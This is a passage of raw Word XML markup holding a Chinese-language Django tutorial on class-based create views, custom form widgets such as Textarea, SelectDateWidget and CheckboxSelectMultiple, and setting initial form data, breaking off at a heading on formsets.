    <w:p w14:paraId="501C1483" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>from .models import Article</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B8723E0" w14:textId="77ACF886" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from .forms import ArticleForm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40FB84BE" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class ArticleCreateView(CreateView):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A1DE28E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    model = Article</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68F59C88" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    form_class = ArticleForm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0974C4F4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    template_name = 'blog/article_create_form.html'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="135DBE12" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E517B3B" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>自定义表单输入的widget</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66F12CDF" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django forms的每个字段你都可以选择你喜欢的输入widget，比如多选，复选框。你还可以定义每个widget的css属性。如果你不指定，Django会使用默认的widget，有时比较丑。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D5347D2" w14:textId="5FB48201" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0EF710D8" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>比如下面这段代码定义了表单姓名字段的输入控件为Textarea，还指定了其样式css。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E9E5EF3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django import forms</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75E473B7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7BAE3A26" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class ContactForm(forms.Form):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B59E19B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    name = forms.CharField(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="276F7DFC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        max_length=255,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0679E558" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        widget=forms.Textarea(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B8F98FB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            attrs={'class': 'custom'},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28B88E37" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        ),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="374DE1DF" w14:textId="0EECAD14" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41DEF2B7" w14:textId="4B34A56D" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="211233FE" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>设置widget可以是你的表单大大美化，方便用户选择输入。比如下面案例里对年份使用了SelectDateWidget，颜色则使用了复选框CheckboxSelectMultiple。单选可以用RadioSelect和Select。常见文本输入可以用TextInput和TextArea。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20B399FE" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django import forms</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76C5D2E5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B0A9651" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>BIRTH_YEAR_CHOICES = ('1980', '1981', '1982')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03AED8DD" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>COLORS_CHOICES = (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69D6AC89" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    ('blue', 'Blue'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="582D3912" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    ('green', 'Green'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67225540" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    ('black', 'Black'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05D840D7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="238EC2BC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="19FA80C2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class SimpleForm(forms.Form):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03BBE874" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">    birth_year = forms.DateField(widget=forms.SelectDateWidget(years=BIRTH_YEAR_CHOICES))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CCD8A66" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    favorite_colors = forms.MultipleChoiceField(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0343DC0A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        required=False,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A22F3F7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        widget=forms.CheckboxSelectMultiple,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4258ED0C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        choices=COLORS_CHOICES,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52616520" w14:textId="09F620E7" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D714BE5" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>表单数据初始化</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E799722" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>有时我们需要对表单设置一些初始数据，我们可以通过initial方法，如下所示。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F48A884" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>form = ContactForm(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AC039C0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    initial={</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D6A2226" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        'name': 'First and Last Name',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19A7F8CD" w14:textId="6B7472EF" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    },)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C009747" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>其编辑修改类应用场景中，我们还要给表单提供现有对象的数据，而不是渲染一张空表单，这时我们可这么做。该方法仅适用于由模型创建的ModelForm，而不适用于自定义的表单。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55BB9C9D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>contact = Contact.objects.get(id=1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DB87196" w14:textId="1BACF83A" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>form =  ContactForm(instance = contact)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47EA4575" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>对于自定义的表单，可以设置default_data。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1729BC01" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>default_data = {'name': 'John', 'email': 'someone@hotmail.com', }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01777BAA" w14:textId="1974212F" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>form = ContactForm(default_data)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FCFDA49" w14:textId="371E211F" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="43F5FED5" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Formset的使用</w:t>
      </w:r>
    </w:p>
